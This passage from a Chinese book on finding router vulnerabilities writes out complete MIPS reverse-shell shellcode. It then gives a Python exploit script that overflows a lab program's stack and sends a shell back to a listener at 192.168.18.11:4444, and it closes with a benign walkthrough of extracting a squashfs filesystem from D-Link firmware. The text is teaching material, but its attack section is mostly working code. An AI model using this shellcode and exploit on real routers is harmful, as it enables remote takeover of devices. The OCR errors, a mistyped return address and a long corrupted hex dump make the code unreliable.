第 13 行～第 15 行：虽然上面构造的端口值覆盖了 IP 地址域 $sp-26，但是没有关系，这里从 $sp-26 开始写入 IP 地址（0xc0a80249）。此时，struct sockaddr 结构体已经构造完毕，其后的 8 字节是填充字节。

第 16 行：connect 的第 2 个参数（struct sockaddr）结构体首地址是从 $sp-30 开始的。

第 17 行～第 18 行：将第 2 个参数占用的字节数 16 写入 connect 的第 3 个参数 $a2。

connect 系统调用相对复杂一些，需要构造一个数据结构，如图 7-4 所示，struct sockaddr 结构体的大小为 16 字节。

至此，connect 系统调用结束，关键在于 struct sockaddr 结构体的构造。仔细研读 Linux 的帮助文档及尝试调试可以让我们对该结构体有更清晰的认识，对快速、准确编写 Shellcode 也有很大的帮助。

 </div>

下面我们看看 dup2 复制文件描述符的系统调用，代码如下。

##### 源码 18 dup2 系统调用

sys_dup2
# a0: oldfd (socket)
# al: newfd (0, 1, 2)
li $s1,-3
nor $s1,$s1,$zero
lw $a0,-1($sp)
dup2_loop:move $a1,$s1 # dup2_loop
li $v0,4063 # sys_dup2
syscall
li $s0,-1
addi $s1,$s1,-1
bne $s1,$s0,$dup2_loop

dup2 系统调用需要被执行 3 次，因此可以使用一个循环来节省空间，相当于以下代码。

1 $s1 = 2;
2 do {
3 dup2(socket_handle,$s1);
4 $s0 = -1;
5 $s1 = $s1 -1;
6 }while($s1 != $s0);

翻译成这样的伪代码就很好理解了，socket_handle 是执行 socket 函数以后保存 $sp-1 的文件描述符。复制 3 个句柄以后，就可以开始使用 execve 系统调用产生一个 Shell 了。

##### 源码 19 executive 系统调用

sys_execve
# a0: filename (stored on the stack) "//bin/sh"
# a1: argv "//bin/sh"
# a2: envp (null)
slti a2, zero, -1
lui t7, 0x2f2f "//"
ori t7, t7, 0x6269 "bi"
sw t7, -20(sp)
lui t6, 0x6e2f "n/"
ori t6, t6, 0x7368 "sh"
sw t6, -16(sp)
sw zero, -12(sp)
addiu a0, sp, -20
sw a0, -8(sp)
sw zero, -4(sp)
addiu al, sp, -8
li v0, 4011 # sys_execve
syscall

7.1.2 节介绍了如何使用 execve 执行任意命令，在调用 execve 时，构造参数使用了将要执行的程序文件附加在 Shellcode 尾部的做法。在本例中，因为我们只需要执行 /bin/sh，所以使用 “sw” 指令直接将 “//bin/sh”（4 字节对齐）写入堆栈 $sp-20 即可，系统调用命令为 “execve(//bin/sh",0,0);”。

经过上面的分析，一个完整的反向连接 Shellcode 已经完成了，下面是完整的代码。

##### 源码 20 完整的 reverse_tcp Shellcode

1 .section .text
2 .globl _start
3 .set noreorder
4 _start:
5 # sys_socket
6 # a0: domain
7 # a1: type
8 # a2: protocol
9 li $t7,-6
10 nor $t7,$t7,$zero
11 addi $a0,$t7,-3

addi $a1,$t7,-3

slti $a2,$zero,-1

li $v0,4183 # sys_socket

syscall

# sys_connect

# a0: sockfd (stored on the stack)

# a1: addr (data stored on the stack)

# a2: addrlen

sw $v0,-1($sp)

lw $a0,-1($sp)

li $t7,0xfffd

nor $t7,$t7,$zero

sw $t7,-32($sp)

lui $t6,0x7777 #port

ori $t6,$t6,0x7777

sw $t6,-28($sp)

lui $t6,0xc0a8 #ip(high)

ori $t6,$t6,0x0249 #ip(low)

sw $t6,-26($sp)

addiu $a1,$sp,-30

li $t4,-17

nor $a2,$t4,$zero

li $v0,4170 # sys_connect

syscall

# sys_dup2

# a0: oldfd (socket)

# a1: newfd (0, 1, 2)

li $s1,-3

nor $s1,$s1,$zero

lw $a0,-1($sp)

dup2_loop:move $a1,$s1 # dup2_loop

li $v0,4063 # sys_dup2

syscall

li $s0,-1

addi $s1,$s1,-1

bne $s1,$s0,dup2_loop

# sys_execve

# a0: filename (stored on the stack)

# a1: argv "//bin/sh"

# a2: envp (null)

slti $a2,$zero,-1

lui $t7,0x2f2f #"//"

ori $t7,$t7,0x6269 #"bi"

sw $t7,-20($sp)

揭秘家用路由器 0day 漏洞挖掘技术

56 lui $t6,0x6e2f #"n/"
57 ori $t6,$t6,0x7368 #"sh"
58 sw $t6,-16($sp)
59 sw $zero,-12($sp)
60 addiu $a0,$sp,-20
61 sw $a0,-8($sp)
62 sw $zero,-4($sp)
63 addiu $al,$sp,-8
64 li $v0,4011 # sys_execve
65 sycall

测试 Shellcode，可以按下面的步骤进行。

01 保证 Shellcode 主机与 192.168.2.73 主机网络连通。在 192.168.2.73 主机上使用 nc 命令开启监听 30583 端口。

02 编译链接源码 20 并运行，就可以连接到主机 192.168.2.73。

03 此时在 192.168.2.73 主机上看不到任何已连接的回显，但是输入一个 Linux 命令就可以看到远程 Shellcode 主机的执行结果，如图 7-5 所示。

 </div>

以上代码都采用了 MIPS 大端机格式。如果需要小端机格式的 Shellcode，在小端机上使用相同的方法编译链接即可。

## 7.4 Shellcode应用实例

在第 6 章中给出了一个存在漏洞的例子程序 vuln_system，当时我们是通过调用程序代码中的一处的 system 调用来执行任意命令的。在本章中，我们介绍了如何编写基于 MIPS 的 Shellcode 的方法，因此，我们再一次攻击第 6 章中的漏洞实例程序，让它执行我们编写的 reverse_tcp 这段 Shellcode。

#### 7.4.1 劫持PC和确定偏移

这个步骤在第 6 章中已经分析了，在文件 passwd 中填充 412（0x19C）字节后可精确劫持 PC。使用下面的命令构造该偏移数据进行测试。

$ python -c "print 'A'\*0x19C+'BBBBCCCC'">passwd

使用如下命令运行漏洞程序 vuln_system，等待 IDA 进行远程调试。

$qemu-mips -g 1234 vuln_system

程序启动以后，使用 IDA 加载 vuln_system，附加 vuln_system 的进程开始远程调试，按“F9”快捷键让程序运行，此时程序崩溃。从 IDA 调试器中可以发现，我们已经成功劫持 PC 指向 0x42424242（BBBB）处并执行指令，崩溃现场如图 7-6 所示。

#### 7.4.2 确定攻击途径

在这里，我们使用 reverse_tcp 这个 Shellcode 展开攻击，接下来的问题就变成如何找到能够劫持执行流程转去执行 Shellcode 的途径。我们首先来看程序崩溃时漏洞寄存器及堆栈的情况，如图 7-7 所示。

可以看到，在我们构造的数据中，BBBB（42424242）覆盖 0x40800604 处保存的返回地址，而在 BBBB 之后的数据 CCCC（43434343）继续向后覆盖到了 0x40800608 处。

因此，在这里我们可以用值 0x40800608 覆盖 0x40800604 处的返回地址，使执行流程转到 0x40800608 处，而在 0x40800608 处的数据通过溢出被覆盖为我们的 Shellcode。

如此一来，Shellcode 就能被顺利地填充到堆栈并执行了。

<table border=1 style='margin: auto; word-wrap: break-word;'><tr><td style='text-align: center; word-wrap: break-word;'>X</td><td style='text-align: center; word-wrap: break-word;'>Debugger</td><td style='text-align: center; word-wrap: break-word;'>X</td><td style='text-align: center; word-wrap: break-word;'>Structures</td><td style='text-align: center; word-wrap: break-word;'>X</td><td style='text-align: center; word-wrap: break-word;'>En</td><td style='text-align: center; word-wrap: break-word;'>Enums</td></tr></table>

 </div>

 </div>

需要注意的是，这里直接使用了 Shellcode 在堆栈中的首地址 0x40800608 覆盖返回地址。但由于堆栈是变化的，所以我们在测试时可能需要重新定位这个地址。

至此，我们可以确定如图 7-8 所示的攻击路径。确定了完整的攻击路径之后，就可以开始构建漏洞攻击数据了。

 </div>

#### 7.4.3 构建漏洞攻击数据

根据前面的分析，编写如下测试脚本。

import struct
import socket
def makeshellcode(hostip,port):
    host=socket.ntohl(struct.unpack('I',socket.inet_aton(hostip))[0])
    hosts = struct.unpack('cccc',struct.pack('>L',host))
    ports = struct.unpack('cccc',struct.pack('>L',port))
    mipshell ="\x24\x0f\xff\xfa"  # li t7,-6
    mipshell+="\x01\xe0\x78\x27"  # nor t7,t7,zero
    mipshell+="\x21\xe4\xff\xfd"  # addi a0,t7,-3
    mipshell+="\x21\xe5\xff\xfd"  # addi a1,t7,-3
    mipshell+="\x28\x06\xff\xff"  # slti a2,zero,-1
    mipshell+="\x24\x02\x10\x57"  # li v0,4183 # sys_socket

13 mipshell+="\\x01\\x01\\x01\\x0c" # syscall 0x40404
14 mipshell+="\\xaf\\xa2\\xff\\xff" # sw v0,-1(sp)
15 mipshell+="\\x8f\\xa4\\xff\\xff" # lw a0,-1(sp)
16 mipshell+="\\x34\\x0f\\xff\\xfd" # li t7,0xfffd
17 mipshell+="\\x01\\xe0\\x78\\x27" # nor t7,t7,zero
18 mipshell+="\\xaf\\xaf\\xff\\xe0" # sw t7,-32(sp)
19 mipshell+="\\x3c\\x0e" + struct.pack('2c',ports[2],ports[3]) # lui
t6,0x1f90
20 mipshell+="\\x35\\xce" + struct.pack('2c',ports[2],ports[3]) # ori
t6,t6,0x1f90
21 mipshell+="\\xaf\\xae\\xff\\xe4" # sw t6,-28(sp)
22 mipshell+="\\x3c\\x0e" + struct.pack('2c',hosts[0],hosts[1]) # lui
t6,0x7f01
23 mipshell+="\\x35\\xce" + struct.pack('2c',hosts[2],hosts[3]) # ori
t6,t6,0x101
24 mipshell+="\\xaf\\xae\\xff\\xe6" # sw t6,-26(sp)
25 mipshell+="\\x27\\xa5\\xff\\xe2" # addiu a1,sp,-30
26 mipshell+="\\x24\\x0c\\xff\\xfd" # li t4,-17
27 mipshell+="\\x01\\x80\\x30\\x27" # nor a2,t4,zero
28 mipshell+="\\x24\\x02\\x10\\x4a" # li v0,4170 # sys_connect
29 mipshell+="\\x01\\x01\\x01\\x0c" # syscall 0x40404
30 mipshell+="\\x24\\x11\\xff\\xfd" # li s1,-3
31 mipshell+="\\x02\\x20\\x88\\x27" # nor s1,s1,zero
32 mipshell+="\\x8f\\xa4\\xff\\xff" # lw a0,-1(sp)
33 mipshell+="\\x02\\x20\\x28\\x21" # move a1,s1 # dup2_loop
34 mipshell+="\\x24\\x02\\x0f\\xdf" # li v0,4063 # sys_dup2
35 mipshell+="\\x01\\x01\\x01\\x0c" # syscall 0x40404
36 mipshell+="\\x24\\x10\\xff\\xff" # li s0,-1
37 mipshell+="\\x22\\x31\\xff\\xff" # addi s1,s1,-1
38 mipshell+="\\x16\\x30\\xff\\xfa" # bne s1,s0,68 <dup2_loop>
39 mipshell+="\\x28\\x06\\xff\\xff" # slti a2,zero,-1
40 mipshell+="\\x3c\\x0f\\x2f\\x2f" # lui t7,0x2f2f //"
41 mipshell+="\\x35\\xef\\x62\\x69" # ori t7,t7,0x6269 "bi"
42 mipshell+="\\xaf\\xaf\\xff\\xec" # sw t7,-20(sp)
43 mipshell+="\\x3c\\x0e\\x6e\\x2f" # lui t6,0x6e2f "n/"
44 mipshell+="\\x35\\xce\\x73\\x68" # ori t6,t6,0x7368 "sh"
45 mipshell+="\\xaf\\xae\\xff\\xf0" # sw t6,-16(sp)
46 mipshell+="\\xaf\\xa0\\xff\\xf4" # sw zero,-12(sp)
47 mipshell+="\\x27\\xa4\\xff\\xec" # addiu a0,sp,-20
48 mipshell+="\\xaf\\xa4\\xff\\xf8" # sw a0,-8(sp)
49 mipshell+="\\xaf\\xa0\\xff\\xfc" # sw zero,-4(sp)
50 mipshell+="\\x27\\xa5\\xff\\xf8" # addiu a1,sp,-8
51 mipshell+="\\x24\\x02\\x0f\\xab" # li v0,4011 # sys_execve

52 mipshell+="\x01\x01\x01\x0c" #药业0x40404
53 return mipshell
54 if __name__ == 'main':
55     print ['*] prepare shellcode',
56     cmd = "sh"  # command string
57     cmd += "\x00"*(4 - (len(cmd) % 4))  # align by 4 bytes
58     #payload
59     payload = "A"*0x19c  # padding buf
60     payload += struct.pack(">L", 0x4080608)  # PC
61     payload += makeshellcode('192.168.18.11', 4444)  # padding
62     print ' ok!'
63     #create password file
64     print ['+] create password file',
65     fw = open('passwd', 'w')
66     fw.write(payload) #'A*300+'\x00*10+'BBBB')
67     fw.close()
68     print ' ok!'

第 3 行～第 53 行：代码中的 reverse_tcp 机器码来自 7.3 节，反弹 Shell 需要两个参数，一个是远程的 IP 地址，另一个是远程端口。编写 makeshellcode() 函数动态配置 reverse_tcp，从而根据需要将 Shell 反弹到任意 IP 地址的任意端口。

第 59 行：在缓冲区中填充 0x19C 字节的数据。

第 60 行：控制返回地址指向 Shellcode 首地址。

第 61 行：makeshellcode() 函数配置 Shellcode，向主机 192.168.18.11 的 TCP 端口 4444 返回一个 Shell。

第 63 行～第 67 行：将构造的数据写入 passwd 文件。

#### 7.4.4 漏洞测试

在远程主机 192.168.18.11 上监听 4444 端口，这里使用 nc 命令，如图 7-9 所示。

 </div>

使用如下命令执行脚本 exploit-sh.py，构造 passwd 文件。

embedded@ubuntu:~/book-source/8$ python exploit-sh.py
[*] prepare shellcode ok!
[+] create password file ok!
embedded@ubuntu:~/book-source/8$ ls
exploit-sh.py passwd vuln_system

使用 QEMU-MIPS 执行 vuln_system，命令如下。

embedded@ubuntu:~/book-source/8$ gemu-mips vuln_system you have an invalid password!

现在，vuln_system 会停在这里不退出。尽管我们在 NC 上看不到任何回显，但是 Shellcode 已经成功执行了。在 NC 下输入 3 个命令，如图 7-10 所示。

 </div>

可以看到，reverse_tcp 已经成功通过利用漏洞执行了，现在我们可以使用命令控制远程主机了。

# 第 3 篇 路由器漏洞实例分析与利用 ——软件篇

### 第 8 章 路由器文件系统与提取

从本章开始，我们将对路由器的实际漏洞进行详细分析与利用。路由器漏洞的分析与利用的关键环节有获取固件、提取文件系统、漏洞分析与利用及漏洞挖掘。其中，获取固件和提取文件系统是我们进行漏洞分析和漏洞挖掘的基础。获取路由器相应的固件，并从中提取文件系统以后，不仅可以对存在漏洞的应用程序进行漏洞分析，还可以进行漏洞挖掘，进而发现 0day 漏洞。因此，本章将介绍路由器固件及文件系统的相关知识，以及提取文件系统的方法。

## 8.1 路由器文件系统

通常我们所说的更新路由器是指更新路由器的固件，不同的路由器使用了不同的硬件平台、操作系统及固件。通常情况下，路由器的固件中包含操作系统的内核及文件系统。

#### 8.1.1 路由器固件

路由器的固件不是硬件，而是软件，因为在路由器中，它通常是被固化在只读存储器中的，所以称为固件。

路由器与计算机一样，随着时间的推移，厂商可能需要对已经售出的路由器进行漏洞补丁的更新或者功能的扩展和升级。在分析路由器漏洞时，也需要将存在下载漏洞的固件更新到路由器中，方便我们在实际环境中进行漏洞测试。当需要对路由器的固件进行更新时，我们可以访问路由器厂商的网站找到相应版本，然后通过浏览器登录路由器进行更新。例如，笔者使用的是 D-Link DIR-645 路由器，当前固件版本为 1.3，在 D-Link 技术支持官网（http://support.dlink.com/）找到的更新固件版本为 1.4，链接为 ftp://ftp2.dlink.com/PRODUCTS/DIR-645/REVA/DIR-645_FIRMWARE_1.04.B11.ZIP。

将下载的压缩包解压，然后登录路由器，选择下载的固件进行升级，如图 8-1 所示。

在进行漏洞分析时获取路由器的固件通常有两种方式：一种是前面介绍的方法，从路由器厂商提供的更新网站下载；另一种是通过硬件接入，从路由器的 Flash 中提取固件（这种方法会在第 4 篇详细介绍）。

 </div>

路由器固件包含了该路由器中所有的可执行程序及配置文件信息，这些信息对于我们进行路由器漏洞的分析和挖掘都至关重要。获取固件以后，我们就可以从固件中分离文件系统了。

#### 8.1.2 文件系统

文件系统是操作系统的重要组成部分，是操作运行的基础。不同的路由器使用的文件系统格式不尽相同。根文件系统会被打包成当前路由器所使用的文件系统格式，然后组装到固件中。

路由器总是希望文件系统越小越好，因为在路由器设备中，存储设备的大小是非常有限的，所以这些文件系统中各种压缩格式随处可见。

Squashfs 是一个只读格式的文件系统，具有超高压缩率，其压缩率最高可达 34%。当系统启动后，会将文件系统保存在一个压缩过的文件系统文件中，这个文件可以使用换回的形式挂载并对其中的文件进行访问，当进程需要某些文件时，仅将对应部分的压缩文件解压缩。

Squashfs 文件系统常用的压缩格式有 GZIP、LZMA、LZO、XZ（LZMA2），在路由器中被普遍采用。路由器的根文件系统通常会按照 Squashfs 文件系统常用压缩格式中的一种进行打包，形成一个完整的 Squashfs 文件系统，然后与路由器操作系统的内核一起形成更新固件。

## 8.2 手动提取文件系统

要想分析路由器漏洞，必须获得路由器中存在漏洞的应用程序。文件系统是操作系统的重要组成部分，是操作运行的基础。文件系统中包含实现路由器各种功能的基础应用程序，如在家用路由器中实现一个 Web 服务器，使用户可以通过 Web 访问路由器，对路由器进行管理。文件系统能够从固件中提取，而从路由器固件中提取文件系统是一个难点，原因之一在于不同的操作系统使用的文件系统不同。另外，路由器的文件系统压缩算法也有差异，有些路由器甚至会使用非标准的压缩算法打包文件系统。下面介绍采用手工方式从大量杂乱无章的数据中正确识别文件系统并采用适当的方式提取文件系统的方法。

#### 8.2.1 查看文件类型

首先介绍 Linux 下的 file 命令。

file 命令通过定义的 magic 签名文件可以识别各种格式，包括常用的 Linux/Windows 可执行文件、DOC、PDF 及各种压缩格式等。

拿到路由器固件后的第一件事，就是利用 Linux 自带的 file 命令查看文件类型，如图 8-2 所示。

 </div>

在本例中，file 命令并没有发现符合任何文件类型的匹配，但这并不代表该固件就是完全没有接触过的文件格式，原因在于 file 命令是从给定文件的首字节开始的，会按照既定格式进行模式匹配。

一个名为 “hello” 的 MIPS 程序，在程序头加字符串 “exp\n”，形成新的文件 example，方法如下。

embedded@ubuntu:~/Desktop$ echo "exp">example
embedded@ubuntu:~/Desktop$ cat hello >> example

事实上，这两个文件仅开头 4 字节不同，其他部分完全一样。可以说，example 文件中包含了 hello 文件。使用文件比较工具比较两个文件，如图 8-3 所示。

 </div>

分别使用 file 命令查看两个文件，结果如下。

embedded@ubuntu:~/Desktop$ file hello
hello: ELF 32-bit MSB executable, MIPS, MIPS32 version 1 (SYSV),
statically linked, with unknown capability 0x41000000 = 0xf676e75, with
unknown capability 0x10000 = 0x70403, not stripped
embedded@ubuntu:~/Desktop$ file example
example: data

可以看到，原来的 hello 文件可以正常识别为一个 MIPS 大端机格式的应用程序，而对在 hello 文件中添加几个字节以后形成的 example 文件，file 命令只能识别其为数据文件。换言之，file 命令仅能识别这个程序是不是 hello 程序，但不能告诉我们这个文件中是不是包含了 hello 文件。路由器固件就如同这个 example 文件，不仅包含文件系统，还包含其他数据（如内核数据）。因此，我们需要通过下面的方法进行进一步的扫描和提取。

#### 8.2.2 手动判断文件类型

如果没有发现符合要求的文件格式，就需要采用下面的方法进一步分析。

文件内容检索步骤如下。

01 “strings|grep” 检索文件系统 magic 签名头。

02 “hexdump|grep” 检索 magic 签名偏移。

03 “dd|file” 确定 magic 签名偏移处的文件类型。

文件系统 magic 签名头是指一个文件系统中包含的一串可识别字符，有了这串字符，表明该文件可能包含某个文件系统。当然，如果要确定是否包含某文件系统，还需要利用其他条件配合证明，也就是以上 02 和 03 两步要做的。如图 8-4 所示，Windows 应用程序以字符串“MZ”开头，但不是所有具有此特征的文件都是可执行程序，它也有可能是一个文本文件，只不过恰巧以“MZ”开头。所以，仅凭单一特征就确定一个文件的类型是有失偏颇的。

calc.exe
C.Windows\System32

文件大小：0.7 MB
776.192 字节

Offset 0 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15
00000000 4D 5A 90 00 03 00 00 00 04 00 00 00 FF FF 00 00 MZ 00000016 B8 00 00 00 00 00 00 00 40 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 0

 </div>

从 D-Link 技术支持官网下载固件 DIR-645 1.04 B11，地址为 ftp://ftp2.dlink.com/PRODUCTS/DIR-645/REVA/DIR-645_FIRMWARE_1.04.B11.ZIP，然后将其更名为 “firmware.bin”。下面我们就根据检索步骤对 firmware.bin 进行文件系统检索。

# 1. 检索文件系统的magic签名

文件系统头部特征是根据每一种文件系统开头的几字节提炼出来的。常用的文件系统头部特征如下。

cramfs 文件系统头部特征字符为 “0x28cd3d45”。

squashfs 文件系统头部特征较多，其中一些是标准的 squashfs 头部，有些是国外的研究人员发现的，大致有 sqsh、hsqs、qshs、shsq、hsqt、tqsh、sqlz 7 种。

检查是否存在 cramfs 文件系统头部特征和 magic 签名 “0x28cd3d45”。因为目前不知道文件组织是大端机格式还是小端机格式，所以需要进行 2 次搜索，示例如下，结果如图 8-5 所示。

 </div>

看来运气不太好，该文件不包含 cramfs 文件系统。我们来看看 squashfs 文件系统。该文件系统包含的头部特征比较多，我们依次进行测试，测试命令如下，结果如图 8-6 所示。

 </div>

可以看到，这里已经发现了一个 squashfs 文件系统 “hsqs” 的 magic 签名头，但我们不能完全确定该文件包含的是否为一个 squashfs 文件系统，还需要进一步确定 firmeare.bin 中的是不是 squashfs 文件系统。

# 2. 确定文件系统

通过如下命令确定是否真的包含 squashfs 文件系统，结果如图 8-7 所示。

 </div>

可以看到，在偏移 0x00160090（十进制 1441936）处发现了“hsqs”。通过如图 8-8 所示的命令复制从 0x00160090 处开始的 100 字节数据。之所以要复制 100 字节的数据，是因为 squashfs 文件系统的头部校验不会超过 100 字节。

使用 file 命令确定复制的文件 squash 的文件类型，如图 8-9 所示。

到这里，file 命令已经确定，刚刚从 fireware.bin 文件中复制的 100 字节数据就是 squashfs 文件系统的头部，且该文件系统的大小为 6164554 字节。

揭秘家用路由器 0day 漏洞挖掘技术

hack@ubuntu-S, dd if=firmware.bin bs=1 count=160 skip=1441936 of=squash
100+0 records in
100+0 records out
100 bytes (100 B) copied, 0.000136633 S0 732 KB/s
hack@ubuntu-S

 </div>

 </div>

#### 8.2.3 手动提取文件系统

我们已经知道，fireware.bin 在偏移 0x00160090（十进制 1441936）处包含 squashfs 文件系统，其大小为 6164554 字节，因此，可以使用 dd 命令复制该数据块，如图 8-10 所示。

backqubuntus-S dd tf=FLGware.bln bs=1 count=6164554 skip=1441936 of=kernel.squ
sh
6164554+0 records tn
6164554+0 records out
6164554 bytes (6.2 MB) copied, 14.1469 s, 436 KB/s
hackqubuntus-S

 </div>

属于 squashfs 文件系统的数据已经成功提取出来，接下来的工作就是还原 squashfs 文件系统中的根文件系统。

尽管 Linux 自带的 file 命令中包含与 squashfs 文件系统相关的 magic 签名头部信息，但这对我们深入了解该文件系统而言是不够的。下面是 squashfs 文件系统中 magic 签名头 “hsqs” 的具体信息，通过这个 magic 签名头文件可以识别 squashfs 使用的压缩算法，示例如下。关于 magic 签名文件的定义，在 8.3 节会详细说明。

#-----File Systems-----
# filenames => filesystem-hsqs
# Squashfs, little endian
0 string hsqs Squashfs filesystem, little endian,
>28 leshort >10 invalid

6. >28 leshort <1 invalid
7. >30 leshort >10 invalid
8. >28 leshort x version %d.
9. >30 leshort x \b&d,
10. >28 leshort >3 compression:
11. >>20 leshort 1 \bgzip,
12. >>20 leshort 2 \blzma,
13. >>20 leshort 3 \bgzip (non-standard type definition)
14. >>20 leshort 4 \blzma (non-standard type definition)
15. >>20 leshort 0 \binvalid,
16. >>20 leshort >4 \binvalid,
17. >28 leshort <3
18. >>8 lelong x size: %d bytes,
19. >>8 lelong x {file-size:%d}
20. >28 leshort 3
21. >>63 lequad x size: %lld bytes,
22. >>63 lequad x {file-size:%lld}
23. >28 leshort >3
24. >>40 lequad x size: %lld bytes,
25. >>40 lequad x {file-size:%lld}
26. >4 lelong x %d inodes,
27. >28 leshort >3
28. >>12 lelong blocksize: %d bytes,
29. >28 leshort <2
30. >>32 leshort x blocksize: %d bytes,
31. >28 leshort 2
32. >>51 lelong x blocksize: %d bytes,
33. >28 leshort 3
34. >>51 lelong x blocksize: %d bytes,
35. >28 leshort >3
36. >>12 lelong x blocksize: %d bytes,
37. >28 leshort <4
38. >>39 ledate x created: %s
39. >28 leshort >3
40. >>8 ledate x created: %s
41. >28 leshort <3
42. >>8 lelong x {jump-to-offset:%d}
43. >28 leshort 3
44. >>63 lequad x {jump-to-offset:%lld}
45. >28 leshort >3
46. >>40 lequad x {jump-to-offset:%lld}

利用 file 命令的 “-m” 参数加载自定义的 magic 签名文件，输出更加详细的信息，如图 8-11 所示。

 </div>

可以看出，从 firmware.bin 中提取的 kernel.squash 使用的是 LZMA 压缩方式。在 Ubuntu 下有一个工具可以解压 squashfs 文件系统，可以用 “sudo apt-get install squashfs-tools” 命令安装该工具。但是，该工具目前仅支持 GIZP、LZO、XZ 格式，不支持 LZMA 格式。所以，这里可以使用 firmware-mod-kit 解压缩。

使用如下命令安装 firmware-mod-kit。

$ git clone https://github.com/mirror/firmware-mod-kit.git
$ sudo apt-get install git build-essential zliblg-dev liblzma-dev python-magic

$ cd firmware-mod-kit

$./configure && make

使用如下名解压 kernel.squash，解压信息如图 8-12 所示。

~/book-source/8$ /opt/firmware-mod-kit/unsquashfs_all.sh kernel.squash

 </div>

成功提取文件系统后，会在当前目录下生成一个名为“squashfs-root”的文件夹，打开后可以看到如图 8-13 所示的界面。熟悉 Linux 的读者应该明白，这就是 squashfs 文件系统中包含根文件系统的所有必备的目录和应用程序等。

 </div>

## 8.3 自动提取文件系统

